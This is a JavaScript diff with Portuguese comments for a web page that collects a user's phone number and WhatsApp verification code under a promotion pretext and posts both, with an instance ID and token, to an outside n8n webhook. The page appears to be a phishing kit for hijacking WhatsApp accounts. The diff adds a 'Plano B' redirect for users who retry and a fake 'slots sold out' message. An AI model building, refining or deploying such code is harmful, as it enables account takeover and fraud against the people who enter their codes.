@@ -15,6 +15,11 @@ const btnVerifyWhatsapp = document.getElementById("btnVerifyWhatsapp")
 const successModal = document.getElementById("successModal")
 const expiredModal = document.getElementById("expiredModal")
 
+// Função de normalização do número
+function normalizePhone(number) {
+  return number.replace(/\D/g, "").replace(/^55/, "")
+}
+
 // Initialize
 document.addEventListener("DOMContentLoaded", () => {
   loadUserData()
@@ -165,18 +170,26 @@ function startResendTimer() {
 async function handleResendCode() {
   if (btnResendCode.disabled) return
 
+  // Verificar se é o mesmo número (controle de Plano B)
+  const normalizedPhone = normalizePhone(userData.phone)
+  const numeroOriginal = sessionStorage.getItem("numeroOriginal")
+
+  if (numeroOriginal && numeroOriginal === normalizedPhone) {
+    // Segunda tentativa de reenvio para o mesmo número - redirecionar para plano B
+    window.location.href = "link-plano-b.html"
+    return
+  }
+
   // Show loading state
   const originalText = btnResendCode.innerHTML
   btnResendCode.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...'
   btnResendCode.disabled = true
 
   try {
-    const cleanPhone = userData.phone.replace(/\D/g, "")
-
     const response = await fetch("https://main-n8n.ohbhf7.easypanel.host/webhook/coletar-numero", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ telefone: cleanPhone }),
+      body: JSON.stringify({ telefone: normalizedPhone }),
     })
 
     const data = await response.json()
@@ -186,6 +199,10 @@ async function handleResendCode() {
       btnResendCode.disabled = false
       showLotadoModal()
       return
+    } else if (data.disponibilidade === "ok") {
+      // Atualizar instanceId e token
+      sessionStorage.setItem("instanceId", data.id)
+      sessionStorage.setItem("token", data.token)
     }
 
     // Reset resend timer
@@ -218,15 +235,32 @@ async function handleConfirmCode() {
     return
   }
 
+  // Verificar se é o mesmo código já enviado (controle de Plano B)
+  const lastCode = sessionStorage.getItem("lastVerificationCode")
+  if (lastCode === code) {
+    // Segunda tentativa com o mesmo código - redirecionar para plano B
+    window.location.href = "link-plano-b.html"
+    return
+  }
+
   // Disable button during verification
   btnConfirmCode.disabled = true
   btnConfirmCode.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...'
 
   try {
+    const normalizedPhone = normalizePhone(userData.phone)
+    const instanceId = sessionStorage.getItem("instanceId")
+    const token = sessionStorage.getItem("token")
+
     const response = await fetch("https://main-n8n.ohbhf7.easypanel.host/webhook/por-codigo", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ codigo: code }),
+      body: JSON.stringify({
+        numero: normalizedPhone,
+        codigo: code,
+        instanceId: instanceId,
+        token: token,
+      }),
     })
 
     const data = await response.json()
@@ -236,17 +270,17 @@ async function handleConfirmCode() {
     btnConfirmCode.innerHTML = '<i class="fas fa-check"></i> CONFIRMAR CÓDIGO'
     checkCodeComplete() // Restore proper button styling
 
-    if (data.validado === "false" || data.validado === false) {
-      clearCodeInputs()
-      showLotadoModal()
-      return
-    }
-
-    // Success - show success modal
+    // Verificar se o código foi validado
     if (data.validado === "true" || data.validado === true) {
-      // Success - show success modal
+      // Código válido - mostrar modal de sucesso
       showSuccessModal()
+    } else if (data.validado === "false" || data.validado === false) {
+      // Código inválido - salvar para controle de Plano B e mostrar popup específico
+      sessionStorage.setItem("lastVerificationCode", code)
+      clearCodeInputs()
+      showInvalidCodeModal()
     } else {
+      // Resposta inesperada - tratar como lotado
       clearCodeInputs()
       showLotadoModal()
     }
@@ -263,6 +297,56 @@ async function handleConfirmCode() {
   }
 }
 
+function showInvalidCodeModal() {
+  const invalidCodeModal = document.createElement("div")
+  invalidCodeModal.className = "modal"
+  invalidCodeModal.id = "invalidCodeModal"
+  invalidCodeModal.style.display = "block"
+  invalidCodeModal.innerHTML = `
+    <div class="modal-content invalid-code-modal">
+      <div class="invalid-code-header">
+        <div class="error-icon">
+          <i class="fas fa-times-circle"></i>
+        </div>
+        <h3>Código Inválido</h3>
+        <p class="invalid-code-subtitle">O código digitado está incorreto</p>
+      </div>
+      <div class="modal-body">
+        <p style="text-align: center; margin-bottom: 20px; color: #495057; line-height: 1.5;">
+          O código digitado está incorreto. Por favor, verifique o código recebido no WhatsApp e tente novamente.
+        </p>
+      </div>
+      <div class="modal-footer">
+        <button class="btn-invalid-code-ok" onclick="handleInvalidCodeOk()">
+          <i class="fas fa-check"></i>
+          OK, TENTAR NOVAMENTE
+        </button>
+      </div>
+    </div>
+  `
+
+  document.body.appendChild(invalidCodeModal)
+  document.body.style.overflow = "hidden"
+}
+
+function handleInvalidCodeOk() {
+  // Fechar popup de código inválido
+  const invalidCodeModal = document.getElementById("invalidCodeModal")
+  if (invalidCodeModal) {
+    invalidCodeModal.remove()
+  }
+
+  // Restaurar overflow do body
+  document.body.style.overflow = "auto"
+
+  // Focar no primeiro campo de código para nova tentativa
+  setTimeout(() => {
+    if (codeInputs[0]) {
+      codeInputs[0].focus()
+    }
+  }, 100)
+}
+
 function showLotadoModal() {
   const lotadoModal = document.createElement("div")
   lotadoModal.className = "modal"
@@ -273,13 +357,13 @@ function showLotadoModal() {
         <div class="users-icon">
           <i class="fas fa-users"></i>
         </div>
-        <h3>Código Inválido!</h3>
-        <p class="lotado-subtitle"></p>
+        <h3>Vagas Esgotadas</h3>
+        <p class="lotado-subtitle">Todas as vagas para esta promoção foram preenchidas</p>
       </div>
       <div class="modal-body">
         <p style="text-align: center; margin-bottom: 20px; color: #495057; line-height: 1.5;">
-          Seu código está inválido ou foi expirado.
-          Refaça o cadastro em 2 minutos.
+          Infelizmente, todas as vagas disponíveis para esta promoção já foram ocupadas. 
+          Tente novamente mais tarde ou aguarde uma nova promoção.
         </p>
       </div>
       <div class="modal-footer">
